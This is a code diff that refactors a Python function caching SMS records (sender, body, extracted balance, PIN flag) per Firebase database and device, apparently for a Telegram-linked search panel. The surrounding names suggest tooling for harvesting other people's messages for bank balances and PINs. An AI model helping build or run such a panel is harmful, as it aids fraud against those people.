@@ -104,21 +104,30 @@ def count_personal_dbs(db: Session, telegram_id: int) -> int:
 
 
 def upsert_cached_sms(db: Session, firebase_db_id: int, device_key: str, rows: list[dict]) -> None:
+    if not rows:
+        return
+    settings = get_settings()
+    cap = settings.panel_search_max_sms_per_db
+    if len(rows) > cap:
+        rows = rows[:cap]
     db.query(CachedSms).filter(CachedSms.firebase_db_id == firebase_db_id).delete()
-    for row in rows:
-        db.add(
-            CachedSms(
-                firebase_db_id=firebase_db_id,
-                device_key=device_key[:256],
-                sender=str(row.get("sender", ""))[:128],
-                body=str(row.get("body", "")),
-                message_at=row.get("message_at"),
-                balance_value=row.get("balance"),
-                has_pin=bool(row.get("has_pin")),
-                raw_path=str(row.get("raw_path", ""))[:512],
-                fetched_at=datetime.utcnow(),
-            )
-        )
+    now = datetime.utcnow()
+    device_key = device_key[:256]
+    mappings = [
+        {
+            "firebase_db_id": firebase_db_id,
+            "device_key": device_key,
+            "sender": str(row.get("sender", ""))[:128],
+            "body": str(row.get("body", "")),
+            "message_at": row.get("message_at"),
+            "balance_value": row.get("balance"),
+            "has_pin": bool(row.get("has_pin")),
+            "raw_path": str(row.get("raw_path", ""))[:512],
+            "fetched_at": now,
+        }
+        for row in rows
+    ]
+    db.bulk_insert_mappings(CachedSms, mappings)
     db.commit()
 
 
